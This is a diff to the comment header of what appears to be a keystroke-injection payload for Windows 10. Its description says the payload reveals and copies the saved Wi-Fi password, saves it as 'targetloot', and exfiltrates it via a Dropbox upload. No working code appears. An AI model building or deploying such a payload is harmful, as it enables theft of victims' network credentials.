@@ -1,6 +1,7 @@
 REM Title: Hard_Con_Exfil
 REM Author: LulzAnarchyAnon
-REM Description: This payload navagates it's way to Hardware, and Connection properties.
+REM Description: This payload navagates it's way to Hardware, and Connection properties
+REM where it then makes the Wifi password visible, and then clicks copy.
 REM It then copies, and saves it as a notepad file named "targetloot" to the Downloads folder. 
 REM It is then exfiltrated via a DropBox Upload.
 REM Target: Windows 10 PowerShell
